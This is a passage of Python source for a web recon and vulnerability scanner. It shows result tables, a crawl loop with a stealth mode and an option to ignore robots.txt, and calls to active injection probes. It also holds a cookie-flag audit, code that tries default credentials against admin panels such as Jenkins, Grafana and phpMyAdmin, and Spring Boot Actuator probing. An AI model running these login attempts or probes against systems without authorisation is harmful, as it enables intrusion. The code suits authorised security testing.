        "SecurityHeaders": '''CREATE TABLE IF NOT EXISTS SecurityHeaders (
                                domain      TEXT NOT NULL,
                                present     TEXT,
                                missing     TEXT,
                                leaking     TEXT,
                                checked_at  TEXT NOT NULL
                             )''',
        "JSFindings":      '''CREATE TABLE IF NOT EXISTS JSFindings (
                                url         TEXT NOT NULL,
                                js_url      TEXT NOT NULL,
                                finding_type TEXT NOT NULL,
                                value       TEXT NOT NULL,
                                context     TEXT,
                                found_at    TEXT NOT NULL
                             )''',
        "XHREndpoints":    '''CREATE TABLE IF NOT EXISTS XHREndpoints (
                                url         TEXT NOT NULL,
                                endpoint    TEXT NOT NULL,
                                method      TEXT,
                                found_at    TEXT NOT NULL
                             )''',
        "Subdomains":      '''CREATE TABLE IF NOT EXISTS Subdomains (
                                root_domain TEXT NOT NULL,
                                subdomain   TEXT NOT NULL,
                                ip          TEXT,
                                status_code INTEGER,
                                found_at    TEXT NOT NULL
                             )''',
        "ASN":             '''CREATE TABLE IF NOT EXISTS ASN (
                                ip          TEXT NOT NULL,
                                asn         TEXT,
                                org         TEXT,
                                country     TEXT,
                                is_cdn      INTEGER DEFAULT 0,
                                cdn_name    TEXT,
                                looked_up   TEXT NOT NULL
                             )''',
        "ZoneTransfer":    '''CREATE TABLE IF NOT EXISTS ZoneTransfer (
                                root_domain TEXT NOT NULL,
                                nameserver  TEXT NOT NULL,
                                record      TEXT NOT NULL,
                                found_at    TEXT NOT NULL
                             )''',
        "WAF":             '''CREATE TABLE IF NOT EXISTS WAF (
                                domain      TEXT NOT NULL,
                                waf_vendor  TEXT NOT NULL,
                                detected_by TEXT,
                                found_at    TEXT NOT NULL
                             )''',
        "WellKnown":       '''CREATE TABLE IF NOT EXISTS WellKnown (
                                domain          TEXT NOT NULL,
                                path            TEXT NOT NULL,
                                category        TEXT,
                                content_snippet TEXT,
                                found_at        TEXT NOT NULL
                             )''',
        "WebSockets":      '''CREATE TABLE IF NOT EXISTS WebSockets (
                                page_url        TEXT NOT NULL,
                                ws_url          TEXT NOT NULL,
                                encrypted       INTEGER DEFAULT 0,
                                found_at        TEXT NOT NULL
                             )''',
    }
    if table_name in table_creation_map:
        try:
            conn.execute(table_creation_map[table_name])
        except sqlite3.OperationalError as err:
            print_error(str(err))

def check_db_for_domain(conn, name, table_name):
    table_checks = {
        "Domains": "SELECT url FROM Domains WHERE url=? LIMIT 1",
        "Emails":  "SELECT email_address FROM Emails WHERE email_address=? LIMIT 1",
    }
    sql = table_checks.get(table_name)
    if not sql:
        return True
    try:
        row = conn.execute(sql, (name,)).fetchone()
        return row is None
    except Exception:
        return True

def write_to_domain_database(name, ip, server, content_type, title):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "Domains")
        if check_db_for_domain(conn, name, "Domains"):
            conn.execute(
                "INSERT INTO Domains (url,ip,servertype,content_type,title) VALUES (?,?,?,?,?)",
                (name, ip, server, content_type, title))
            print(timestamp() + " Saved domain: " + name)
    except Exception as e:
        print_error("write_to_domain_database: " + str(e))
    finally:
        conn.close()

def write_to_email_database(email_address):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "Emails")
        if check_db_for_domain(conn, email_address, "Emails"):
            conn.execute("INSERT INTO Emails (email_address) VALUES (?)", (email_address,))
            print(timestamp() + " Saved email: " + email_address)
    except Exception as e:
        print_error("write_to_email_database: " + str(e))
    finally:
        conn.close()

def write_to_dns_database(domain, ip):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "DNS")
        conn.execute("INSERT INTO DNS (domain,ip) VALUES (?,?)", (domain, ip))
    except Exception as e:
        print_error("write_to_dns_database: " + str(e))
    finally:
        conn.close()

def write_to_mx_database(domain, mx_host, preference):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "MX")
        conn.execute("INSERT INTO MX (domain,mx_host,preference) VALUES (?,?,?)", (domain, mx_host, preference))
    except Exception as e:
        print_error("write_to_mx_database: " + str(e))
    finally:
        conn.close()

def write_to_ssl_database(domain, common_name, issuer, not_before, not_after):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "SSL")
        conn.execute(
            "INSERT INTO SSL (domain,common_name,issuer,not_before,not_after) VALUES (?,?,?,?,?)",
            (domain, common_name, issuer, not_before, not_after))
    except Exception as e:
        print_error("write_to_ssl_database: " + str(e))
    finally:
        conn.close()

def write_to_whois_database(domain, registrar, creation_date, expiration_date):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "WHOIS")
        conn.execute(
            "INSERT INTO WHOIS (domain,registrar,creation_date,expiration_date) VALUES (?,?,?,?)",
            (domain, registrar, creation_date, expiration_date))
    except Exception as e:
        print_error("write_to_whois_database: " + str(e))
    finally:
        conn.close()

def write_to_ports_database(domain, ip, port):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "Ports")
        conn.execute("INSERT INTO Ports (domain,ip,port) VALUES (?,?,?)", (domain, ip, port))
    except Exception as e:
        print_error("write_to_ports_database: " + str(e))
    finally:
        conn.close()

def write_to_http_history_database(url, status_code):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "HTTPHistory")
        conn.execute(
            "INSERT INTO HTTPHistory (url,status_code,checked_at) VALUES (?,?,?)",
            (url, status_code, timestamp()))
    except Exception as e:
        print_error("write_to_http_history_database: " + str(e))
    finally:
        conn.close()

def write_to_tech_database(url, technology):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "Technologies")
        conn.execute("INSERT INTO Technologies (url,technology) VALUES (?,?)", (url, technology))
    except Exception as e:
        print_error("write_to_tech_database: " + str(e))
    finally:
        conn.close()

def write_to_robots_database(base_url, content):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "Robots")
        conn.execute(
            "INSERT INTO Robots (base_url,content,fetched_at) VALUES (?,?,?)",
            (base_url, content, timestamp()))
    except Exception as e:
        print_error("write_to_robots_database: " + str(e))
    finally:
        conn.close()

def write_to_sitemap_database(base_url, url):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "Sitemap")
        conn.execute("INSERT INTO Sitemap (base_url,url) VALUES (?,?)", (base_url, url))
    except Exception as e:
        print_error("write_to_sitemap_database: " + str(e))
    finally:
        conn.close()

def write_to_security_headers_database(domain, present, missing, leaking):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "SecurityHeaders")
        conn.execute(
            "INSERT INTO SecurityHeaders (domain,present,missing,leaking,checked_at) VALUES (?,?,?,?,?)",
            (domain, ", ".join(present), ", ".join(missing), ", ".join(leaking), timestamp()))
    except Exception as e:
        print_error("write_to_security_headers_database: " + str(e))
    finally:
        conn.close()

def write_to_subdomains_database(root_domain, subdomain, ip, status_code):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "Subdomains")
        # Only insert if not already known
        existing = conn.execute(
            "SELECT subdomain FROM Subdomains WHERE subdomain=? LIMIT 1", (subdomain,)
        ).fetchone()
        if not existing:
            conn.execute(
                "INSERT INTO Subdomains (root_domain,subdomain,ip,status_code,found_at) VALUES (?,?,?,?,?)",
                (root_domain, subdomain, ip, status_code, timestamp()))
    except Exception as e:
        print_error("write_to_subdomains_database: " + str(e))
    finally:
        conn.close()

# ─────────────────────────────────────────────
# Main crawler
# ─────────────────────────────────────────────

def main_crawler(start_url, same_domain_only=False, resume=False, ignore_robots=False,
                 min_workers=1, max_workers=10):
    global START_URL, SAME_DOMAIN_ONLY, _ac
    START_URL        = start_url
    SAME_DOMAIN_ONLY = same_domain_only
    _ac = AdaptiveConcurrency(start=3, min_workers=min_workers, max_workers=max_workers)
    print(timestamp() + " [AdaptiveConcurrency] min=" + str(min_workers)
          + " max=" + str(max_workers) + " start=3 workers")
    parsed_start = urlparse(start_url)
    base_netloc  = parsed_start.netloc
    base_url     = parsed_start.scheme + "://" + base_netloc

    state = load_state() if resume else None

    if state and state.get("start_url") == start_url:
        url_queue = [(_url_priority(u), next(_pq_seq), u) for u in state["url_queue"]]
        heapq.heapify(url_queue)
        url_seen  = set(state["url_seen"])
        visited   = set(state["visited"])
        i         = state["pages_crawled"]
        same_domain_only = state.get("same_domain_only", same_domain_only)
        print(timestamp() + " Resumed: " + str(i) + " crawled, " + str(len(url_queue)) + " in queue.")
        if ignore_robots:
            print(timestamp() + " robots.txt: ignored (--ignore-robots)")
            rp = None
        else:
            rp = fetch_robots_txt(base_url)
    else:
        if resume and state:
            print(timestamp() + " Saved state is for a different domain — starting fresh.")
        url_queue = [(_url_priority(start_url), next(_pq_seq), start_url)]
        url_seen  = {start_url}
        visited   = set()
        i         = 0
        clear_state()

        # Pre-seed url_seen with URLs crawled within the last 14 days so
        # they are skipped if re-discovered during this run.
        try:
            from datetime import timedelta
            cutoff = (datetime.now() - timedelta(days=14)).strftime("%Y-%m-%d %H:%M:%S")
            _hconn = sqlite3.connect("ScrapeDB")
            _hrows = _hconn.execute(
                "SELECT url FROM HTTPHistory WHERE checked_at >= ?", (cutoff,)
            ).fetchall()
            _hconn.close()
            _recent = {r[0] for r in _hrows}
            url_seen |= _recent
            if _recent:
                print(timestamp() + f" Skipping {len(_recent)} URLs crawled in the last 14 days.")
        except Exception as _e:
            print_error(f"Could not load recent crawl history: {_e}")

        print(timestamp() + " " + _c("Starting NuScrape →", Fore.GREEN, Style.BRIGHT) + " " + start_url)
        if same_domain_only:
            print(timestamp() + " Same-domain-only: staying on " + base_netloc)

        if ignore_robots:
            print(timestamp() + " robots.txt: ignored (--ignore-robots)")
            rp = None
        else:
            print(timestamp() + " Fetching robots.txt...")
            rp = fetch_robots_txt(base_url)

        print(timestamp() + " Fetching sitemap...")
        sitemap_urls = fetch_sitemap(base_url)
        for su in sitemap_urls:
            su = _clean_url(su)
            if su not in url_seen:
                url_seen.add(su)
                _pq_push(url_queue, su)

    _ghost_shuffle_at = random.randint(10, 20) if STEALTH_PROFILE == "GHOST" else 0
    _ghost_crawl_count = 0
    while url_queue:
        # GHOST: periodically shuffle P3/P4 items to randomise crawl patterns
        # while preserving P1/P2 ordering.
        if STEALTH_PROFILE == "GHOST" and _ghost_shuffle_at > 0:
            _ghost_crawl_count += 1
            if _ghost_crawl_count >= _ghost_shuffle_at:
                p12 = [item for item in url_queue if item[0] <= 2]
                p34 = [item for item in url_queue if item[0] > 2]
                random.shuffle(p34)
                url_queue = p12 + p34
                heapq.heapify(url_queue)
                _ghost_crawl_count = 0
                _ghost_shuffle_at = random.randint(10, 20)

        batch = []
        batch_size = _ac.workers
        while len(batch) < batch_size and url_queue:
            url = _pq_pop(url_queue)
            if url in visited:
                continue
            if SOCIAL_FILTER_FLAGS["enabled"] and is_social_media_domain(url):
                continue
            if SKIP_GOOGLE_TRACKING and is_google_tracking_url(url):
                continue
            if not ignore_robots and not is_allowed_by_robots(rp, url):
                print(timestamp() + " Skipping (robots.txt): " + url)
                continue
            batch.append(url)
            visited.add(url)

        if not batch:
            break

        print(timestamp() + " Batch " + str(len(batch)) + " [workers=" + str(_ac.workers)
              + "] | crawled=" + str(i) + " queue=" + str(len(url_queue)))

        results = asyncio.run(crawl_batch(batch, concurrency=_ac.workers))

        for url, html, headers, elapsed, is_error, is_429 in results:
            if is_429:
                _ac.record_429()
            else:
                _ac.record(elapsed, is_error)
            if html is None:
                continue
            i += 1

            # ── Playwright fallback ──────────────────────────
            # If Playwright is enabled and the page looks JS-heavy,
            # re-fetch with a real browser to get the rendered content.
            xhr_endpoints = []
            if PLAYWRIGHT_FLAGS["enabled"] and PLAYWRIGHT_AVAILABLE:
                # Detect techs from aiohttp html first so we can check for JS frameworks
                early_techs = []
                if html:
                    try:
                        from bs4 import BeautifulSoup as _BS
                        _soup = _BS(html, "lxml")
                        _html_str = html.decode("utf-8", errors="ignore").lower()
                        _hdr_str  = str(headers).lower()
                        for tech, sigs in TECH_SIGNATURES.items():
                            if any(h.lower() in _hdr_str for h in sigs["headers"]) or                                any(p.lower() in _html_str for p in sigs["html"]):
                                early_techs.append(tech)
                    except Exception:
                        pass

                if is_js_heavy(html, early_techs):
                    print(timestamp() + " JS-heavy page detected, switching to Playwright: " + url)
                    # Run Playwright in a thread so it doesn't block the main
                    # crawl loop — sync_playwright cannot run inside asyncio
                    pw_result = [None, []]
                    def _pw_thread():
                        pw_result[0], pw_result[1] = playwright_fetch(url)
                    t = threading.Thread(target=_pw_thread, daemon=True)
                    t.start()
                    # Wait with a hard ceiling — don't hang forever
                    t.join(timeout=PLAYWRIGHT_TIMEOUT / 1000 + 10)
                    if t.is_alive():
                        print_error("Playwright thread timeout — skipping: " + url)
                    else:
                        pw_html, xhr_endpoints = pw_result[0], pw_result[1]
                        if pw_html and len(pw_html) > len(html or b""):
                            html = pw_html
                            print(timestamp() + " Playwright content richer — using rendered HTML")
                        for endpoint, method in xhr_endpoints:
                            write_to_xhr_database(url, endpoint, method)

            print(timestamp() + " Parsed: " + url)
            email_scraper(html)
            # Cookie security flag audit — runs on every page response
            check_cookie_security(url, headers)
            # JWT detection and weakness analysis
            scan_for_jwts(url, html, response_headers=headers)
            # SSRF candidate parameter flagging — informational, no HTTP requests
            flag_ssrf_candidates(url, html)
            # WebSocket endpoint discovery — runs unconditionally, no active probing
            discover_websockets(url, html, headers)
            # Passive deserialization format detection — runs unconditionally
            scan_deserial_passive(url, html, headers)
            # Active probe checks — only run when --active-probes is enabled
            if ACTIVE_PROBES:
                # Open redirect detection — probes URL params with canary URL
                check_open_redirects(url, html)
                # GraphQL introspection — probe if this URL looks like a GraphQL endpoint
                probe_graphql_url(url)
                # Mass assignment — injects privileged fields into POST/PUT form endpoints
                check_mass_assignment(url, html)
                # API version enumeration — probes adjacent versions of versioned paths
                check_api_versioning(url)
                # Path traversal detection — probes file-like parameters
                check_path_traversal(url, html)
                # SSTI detection — probes URL params with arithmetic template expressions
                check_ssti(url, html)
                # CRLF injection detection — probes URL params for header injection
                check_crlf_injection(url, html)
                # XXE injection — probes XML-accepting and SOAP endpoints
                check_xxe_injection(url, html, headers)
                # Prototype pollution — server-side body/query probes
                check_prototype_pollution(url, html)
                # SQL injection — error-based and time-based blind detection
                check_sqli(url, html)
                # Command injection — canary echo-based detection
                check_cmdi(url, html)
                # LDAP injection — error-based and auth bypass detection
                check_ldap_injection(url, html)
                # Insecure deserialization — active confirmation of passive signals
                check_insecure_deserialization(url, html, headers)
            # IDOR candidate detection — runs in background thread with timeout
            # to prevent hung verification requests stalling the crawl
            _idor_thread = threading.Thread(
                target=check_idor_candidates, args=(url, html), daemon=True
            )
            _idor_thread.start()
            _idor_thread.join(timeout=30)  # max 30s per page for IDOR checks
            # JS bundle analysis — extract endpoints, secrets, staging URLs
            if PLAYWRIGHT_FLAGS["enabled"] or True:  # always run JS analysis
                extract_and_analyse_js(url, html)
            # S3 bucket references in page HTML
            extract_and_probe_s3_buckets(html, url)
            anchors     = parse_anchors_from_html(html)
            new_domains = get_domain_names(anchors, url_queue, url_seen, base_netloc, same_domain_only)

            _base_root = base_netloc.lstrip("www.")
            for domain in new_domains:
                if domain not in visited:
                    _d_netloc = urlparse(domain).netloc.lstrip("www.")
                    if _d_netloc == _base_root or _d_netloc.endswith("." + _base_root):
                        enrich_domain(domain, response_headers=headers, html_content=html)

        if i % QUEUE_SAVE_INTERVAL == 0 and i > 0:
            save_state(start_url, url_queue, url_seen, visited, i, same_domain_only)

    # Wait for all JS analysis threads to finish writing to the DB before probing
    with _js_analysis_threads_lock:
        pending = list(_js_analysis_threads)
    if pending:
        print(timestamp() + f" Waiting for {len(pending)} JS analysis threads to complete...")
        for t in pending:
            t.join(timeout=30)

    probe_js_endpoints(base_url=start_url)

    clear_state()
    print(timestamp() + " " + _c("Done! Crawled " + str(i) + " pages.", Fore.GREEN, Style.BRIGHT))
    sys.exit(0)


# ─────────────────────────────────────────────
# Cookie security flag auditing
# ─────────────────────────────────────────────

# Cookies whose names suggest they carry session/auth data
SESSION_COOKIE_PATTERNS = re.compile(
    r'(sess|session|auth|token|jwt|login|user|uid|account|remember|csrf|xsrf|sid|id)',
    re.I
)

# Cookie names that strongly indicate session/auth data — HIGH for missing HttpOnly
_SENSITIVE_COOKIE_NAMES = re.compile(
    r'(session|token|auth|jwt|sid|login)',
    re.I
)

# Per-domain, per-cookie-name dedup so each unique (domain, name, issue) fires once
_cookie_seen: dict = {}  # domain -> set of (name, issue_key)

def check_cookie_security(url, response_headers):
    """
    Parse Set-Cookie headers from a response and flag cookies missing
    security flags. Deduplicates per (domain, cookie name, issue) so
    each unique problem fires exactly once per domain.

    Severity per issue type:
      - Missing HttpOnly on sensitive cookie: HIGH
      - Missing HttpOnly on other session cookie: MEDIUM
      - Missing Secure on HTTPS page: MEDIUM
      - SameSite=None without Secure: HIGH
      - Missing SameSite: LOW
    """
    domain  = urlparse(url).netloc
    is_https = url.startswith("https://")

    raw_cookies = response_headers.get("Set-Cookie", "") or \
                  response_headers.get("set-cookie", "")
    if not raw_cookies:
        return

    cookie_list = [raw_cookies] if isinstance(raw_cookies, str) else list(raw_cookies)
    seen = _cookie_seen.setdefault(domain, set())

    for raw in cookie_list:
        parts = [p.strip() for p in raw.split(";")]
        if not parts:
            continue
        name = parts[0].split("=")[0].strip()

        if not SESSION_COOKIE_PATTERNS.search(name):
            continue

        flags = raw.lower()
        is_sensitive = bool(_SENSITIVE_COOKIE_NAMES.search(name))

        # ── Missing HttpOnly ──────────────────────────────────────
        if "httponly" not in flags:
            key = (name, "httponly")
            if key not in seen:
                seen.add(key)
                severity = "HIGH" if is_sensitive else "MEDIUM"
                alert(
                    "INSECURE COOKIE: MISSING HttpOnly",
                    severity,
                    url,
                    f"Cookie '{name}' has no HttpOnly flag — readable by JavaScript, "
                    f"enabling theft via XSS"
                )
                print(timestamp() + f" Cookie issue [{severity}]: '{name}' missing HttpOnly on {url}")

        # ── Missing Secure (HTTPS pages only) ────────────────────
        if is_https and "secure" not in flags:
            key = (name, "secure")
            if key not in seen:
                seen.add(key)
                alert(
                    "INSECURE COOKIE: MISSING Secure",
                    "MEDIUM",
                    url,
                    f"Cookie '{name}' has no Secure flag on an HTTPS page — "
                    f"may be transmitted over HTTP"
                )
                print(timestamp() + f" Cookie issue [MEDIUM]: '{name}' missing Secure on {url}")

        # ── SameSite=None without Secure ─────────────────────────
        if "samesite=none" in flags and "secure" not in flags:
            key = (name, "samesite_none_insecure")
            if key not in seen:
                seen.add(key)
                alert(
                    "INSECURE COOKIE: SameSite=None WITHOUT Secure",
                    "HIGH",
                    url,
                    f"Cookie '{name}' sets SameSite=None without Secure — "
                    f"cross-site requests will include this cookie over plain HTTP"
                )
                print(timestamp() + f" Cookie issue [HIGH]: '{name}' SameSite=None without Secure on {url}")

        # ── Missing SameSite ──────────────────────────────────────
        elif "samesite" not in flags:
            key = (name, "samesite")
            if key not in seen:
                seen.add(key)
                alert(
                    "INSECURE COOKIE: MISSING SameSite",
                    "LOW",
                    url,
                    f"Cookie '{name}' has no SameSite flag — vulnerable to CSRF"
                )
                print(timestamp() + f" Cookie issue [LOW]: '{name}' missing SameSite on {url}")


# ─────────────────────────────────────────────
# Default credential checking
# ─────────────────────────────────────────────

# Known admin panel paths → (service name, credential pairs to try, success indicators)
# success_indicator: string in response body that confirms successful login
DEFAULT_CREDS = [
    # Jenkins
    {
        "service":  "Jenkins",
        "paths":    ["/j_spring_security_check", "/j_acegi_security_check"],
        "method":   "POST",
        "payloads": [
            {"j_username": "admin", "j_password": "admin"},
            {"j_username": "admin", "j_password": "password"},
            {"j_username": "admin", "j_password": ""},
        ],
        "detect_path":   "/login",
        "detect_body":   ["jenkins", "j_username"],
        "success_body":  ["Dashboard [Jenkins]", "manage jenkins", "build history"],
        "success_headers": ["X-Jenkins", "X-Powered-By:Jenkins"],
        "fail_redirect": "/loginError",
    },
    # Grafana
    {
        "service":  "Grafana",
        "paths":    ["/api/login"],
        "method":   "POST_JSON",
        "payloads": [
            {"user": "admin", "password": "admin"},
            {"user": "admin", "password": "Admin@123"},
            {"user": "admin", "password": "grafana"},
        ],
        "detect_path":   "/login",
        "detect_body":   ["grafana", "grafana-app"],
        "success_body":  ['"message":"Logged in"', "Logged in"],
        "fail_body":     ["Invalid username or password"],
    },
    # Kibana
    {
        "service":  "Kibana",
        "paths":    ["/api/security/v1/login", "/internal/security/login"],
        "method":   "POST_JSON",
        "payloads": [
            {"username": "elastic", "password": "elastic"},
            {"username": "kibana",  "password": "kibana"},
            {"username": "admin",   "password": "admin"},
        ],
        "detect_path":   "/app/kibana",
        "detect_body":   ["kibana", "kbn-"],
        "success_body":  ['"statusCode":200', "token"],
        "fail_body":     ["Unauthorized", "Invalid credentials"],
    },
    # Jupyter Notebook
    {
        "service":  "Jupyter",
        "paths":    ["/api/login"],
        "method":   "POST",
        "payloads": [
            {"password": ""},
            {"password": "jupyter"},
            {"password": "admin"},
        ],
        "detect_path":   "/login",
        "detect_body":   ["jupyter", "ipython"],
        "success_body":  ["notebook_list", "/tree"],
        "fail_body":     ["Invalid credentials"],
    },
    # Adminer
    {
        "service":  "Adminer",
        "paths":    ["/adminer.php", "/adminer/", "/adminer"],
        "method":   "POST",
        "payloads": [
            {"auth[server]": "localhost", "auth[username]": "root", "auth[password]": "", "auth[db]": ""},
            {"auth[server]": "localhost", "auth[username]": "admin", "auth[password]": "admin", "auth[db]": ""},
        ],
        "detect_path":   None,  # detection is path-based
        "detect_body":   ["adminer", "login - adminer"],
        "success_body":  ["adminer.org", ">Adminer<", "adminer-login", "select database", "Select database"],
        "fail_body":     ["Invalid credentials", "Access denied"],
    },
    # phpMyAdmin
    {
        "service":  "phpMyAdmin",
        "paths":    ["/phpmyadmin/index.php", "/pma/index.php", "/phpMyAdmin/index.php"],
        "method":   "POST",
        "payloads": [
            {"pma_username": "root",  "pma_password": ""},
            {"pma_username": "root",  "pma_password": "root"},
            {"pma_username": "admin", "pma_password": "admin"},
        ],
        "detect_path":   None,
        "detect_body":   ["phpmyadmin", "pma_navigation"],
        "success_body":  ["pma_table_grid", "phpmyadmin/server_databases"],
        "fail_body":     ["Cannot log in", "Access denied"],
    },
    # Traefik dashboard
    {
        "service":  "Traefik",
        "paths":    ["/dashboard/"],
        "method":   "GET",
        "payloads": [{}],
        "detect_path":   "/dashboard/",
        "detect_body":   ["traefik"],
        "success_body":  ["traefik", "@router"],
        "fail_body":     [],
    },
    # RabbitMQ Management
    {
        "service":  "RabbitMQ",
        "paths":    ["/api/whoami"],
        "method":   "GET_BASIC",
        "payloads": [
            {"username": "guest", "password": "guest"},
            {"username": "admin", "password": "admin"},
        ],
        "detect_path":   "/",
        "detect_body":   ["rabbitmq", "management plugin"],
        "success_body":  ['"name":"guest"', '"name":"admin"', '"tags"'],
        "fail_body":     ["Not authorized"],
    },
]

_defcred_checked = set()

def check_default_credentials(base_url, domain):
    """
    For each known admin panel, check if it's present at the base URL
    then attempt default credential pairs. Alerts CRITICAL on success.

    Two-phase:
      1. Detect: GET detect_path, check detect_body strings
      2. Attempt: POST/GET login endpoint with each credential pair
    """
    if domain in _defcred_checked:
        return
    _defcred_checked.add(domain)

    for panel in DEFAULT_CREDS:
        service = panel["service"]

        # ── Phase 1: Detect if service is present ──────────────
        detect_path = panel.get("detect_path")
        if detect_path:
            detect_url = base_url.rstrip("/") + detect_path
            dresp = safe_get(detect_url, timeout=5)
            if not dresp or dresp.status_code not in (200, 401, 403):
                continue
            body_lower = dresp.text.lower()
            if not any(sig.lower() in body_lower for sig in panel["detect_body"]):
                continue
            print(timestamp() + f" Detected {service} at {detect_url} — trying default creds...")
        else:
            # Path-based detection (Adminer, phpMyAdmin)
            detected = False
            for path in panel["paths"]:
                check_url = base_url.rstrip("/") + path
                dresp = safe_get(check_url, timeout=5)
                if dresp and dresp.status_code == 200:
                    if any(sig.lower() in dresp.text.lower() for sig in panel["detect_body"]):
                        detected = True
                        break
            if not detected:
                continue
            print(timestamp() + f" Detected {service} — trying default creds...")

        # ── Phase 2: Try credential pairs ──────────────────────
        method  = panel["method"]
        success = False

        for path in panel["paths"]:
            if success:
                break
            login_url = base_url.rstrip("/") + path

            for creds in panel["payloads"]:
                try:
                    stealth_delay(domain)
                    if method == "POST":
                        resp = _get_session().post(login_url, data=creds,
                                             headers=create_request_header(),
                                             timeout=6, allow_redirects=True)
                    elif method == "POST_JSON":
                        resp = _get_session().post(login_url, json=creds,
                                             headers={**create_request_header(),
                                                      "Content-Type": "application/json"},
                                             timeout=6, allow_redirects=True)
                    elif method == "GET_BASIC":
                        resp = _get_session().get(login_url,
                                            auth=(creds.get("username",""), creds.get("password","")),
                                            headers=create_request_header(),
                                            timeout=6)
                    else:  # GET
                        resp = _get_session().get(login_url, headers=create_request_header(), timeout=6)

                    body = resp.text.lower()

                    # Check for explicit failure strings first
                    fail_sigs = panel.get("fail_body", [])
                    if any(f.lower() in body for f in fail_sigs):
                        continue

                    # Check for fail redirect
                    fail_redir = panel.get("fail_redirect", "")
                    if fail_redir and fail_redir in resp.url:
                        continue

                    # Check for success — require body or header confirmation, never bare 200
                    success_sigs = panel.get("success_body", [])
                    success_hdrs = panel.get("success_headers", [])
                    header_match = any(
                        (h.split(":")[0] in resp.headers and
                         (len(h.split(":")) == 1 or h.split(":", 1)[1].lower() in resp.headers.get(h.split(":")[0], "").lower()))
                        for h in success_hdrs
                    )
                    if (success_sigs and any(s.lower() in body for s in success_sigs)) or header_match:
                        cred_str = str(creds)
                        alert(
                            f"DEFAULT CREDENTIALS ACCEPTED: {service}",
                            "CRITICAL",
                            login_url,
                            f"{service} login succeeded with credentials: {cred_str}"
                        )
                        print(timestamp() + f" [!!] DEFAULT CREDS WORK: {service} at {login_url} with {cred_str}")
                        success = True
                        break

                except Exception as e:
                    print_error(f"Default cred attempt failed for {service} at {login_url}: {e}")

        if not success and detect_path:
            print(timestamp() + f" {service}: no default creds accepted at {base_url}")


# ─────────────────────────────────────────────
# Spring Boot Actuator exposure detection
# ─────────────────────────────────────────────

# Actuator endpoints ordered by severity
# (path, severity, description)
ACTUATOR_ENDPOINTS = [
    ("/actuator/env",         "CRITICAL", "Exposes all environment variables and config — may contain passwords, API keys, DB credentials"),
    ("/actuator/heapdump",    "CRITICAL", "Full JVM heap dump download — contains in-memory secrets, session tokens, plaintext passwords"),
    ("/actuator/shutdown",    "CRITICAL", "Remote application shutdown endpoint — POST request terminates the JVM process"),
    ("/actuator/httptrace",   "HIGH",     "Full HTTP request/response history including auth headers and cookies"),
    ("/actuator/mappings",    "HIGH",     "Exposes all Spring MVC route mappings — full internal API surface"),
    ("/actuator/beans",       "HIGH",     "Lists all Spring beans and their dependencies — internal architecture exposure"),
    ("/actuator/configprops", "HIGH",     "All @ConfigurationProperties values including credentials"),
    ("/actuator/loggers",     "MEDIUM",   "Log level configuration — can be modified to enable debug logging"),
    ("/actuator/metrics",     "MEDIUM",   "Application performance metrics and internal counters"),
    ("/actuator/info",        "MEDIUM",   "App version, git commit hash, build info"),
    ("/actuator",             "MEDIUM",   "Actuator root — lists all enabled endpoints"),
    # Older Spring Boot 1.x paths
    ("/env",                  "CRITICAL", "Spring Boot 1.x env endpoint — exposes all environment variables"),
    ("/dump",                 "CRITICAL", "Spring Boot 1.x thread dump"),
    ("/trace",                "HIGH",     "Spring Boot 1.x HTTP trace"),
    ("/mappings",             "HIGH",     "Spring Boot 1.x route mappings"),
    ("/beans",                "HIGH",     "Spring Boot 1.x bean list"),
    ("/autoconfig",           "MEDIUM",   "Spring Boot 1.x autoconfiguration report"),
    ("/metrics",              "MEDIUM",   "Spring Boot 1.x metrics"),
]

# Body signatures that confirm a response is a real Actuator endpoint
ACTUATOR_BODY_SIGNATURES = [
    "activeProfiles", "propertySources", "applicationConfig",
    "systemEnvironment", "systemProperties", "managementConfigurationProperties",
    "contexts", "beans", "mappings", "dispatcherServlets",
]

_actuator_checked = set()

def check_actuator_exposure(base_url, domain):
    """
    Probe Spring Boot Actuator endpoints at the given base URL.
    Confirms findings by checking response body for Actuator-specific
    JSON keys before alerting — avoids false positives on generic 200s.

    CRITICAL for env/heapdump (direct credential exposure).
    HIGH for mappings/beans/httptrace (architecture/session exposure).
    MEDIUM for informational endpoints.
    """
    if domain in _actuator_checked:
        return
    _actuator_checked.add(domain)

    for path, severity, description in ACTUATOR_ENDPOINTS:
        # /actuator/shutdown must be tested via POST — skip it in the GET loop
        # and handle it separately below to avoid accidentally triggering a shutdown.
        if "shutdown" in path:
            continue
        url = base_url.rstrip("/") + path
        try:
            # allow_redirects=False — a 301/302 to the homepage means the
            # endpoint doesn't exist. CloudFront and nginx redirect unknown
            # paths rather than returning 404, causing false positives.
            stealth_delay(domain)
            resp = _get_session().get(url, headers=create_request_header(),
                                timeout=5, allow_redirects=False)
            if not resp or resp.status_code not in (200, 401, 403):
                continue

            # 401/403 means the endpoint exists but is auth-protected —
            # worth logging but not alerting as CRITICAL
            if resp.status_code in (401, 403):
                print(timestamp() + f" Actuator endpoint exists (protected): {url} [{resp.status_code}]")
                continue

            body_bytes = resp.content
            body       = resp.text
            ct         = resp.headers.get("Content-Type", "")

            # heapdump returns binary HPROF format.
            # Verify magic bytes: real dumps start with "JAVA PROFILE"
            # (e.g. "JAVA PROFILE 1.0.1\0" or "JAVA PROFILE 1.0.2\0")
            # A WAF/CDN challenge page or HTML error will never match this.
            if "heapdump" in path:
                hprof_magic = b"JAVA PROFILE"
                if body_bytes[:12] == hprof_magic:
                    alert(
                        "SPRING BOOT ACTUATOR EXPOSED",
                        severity,
                        url,
                        f"{description}. HPROF magic bytes confirmed. "
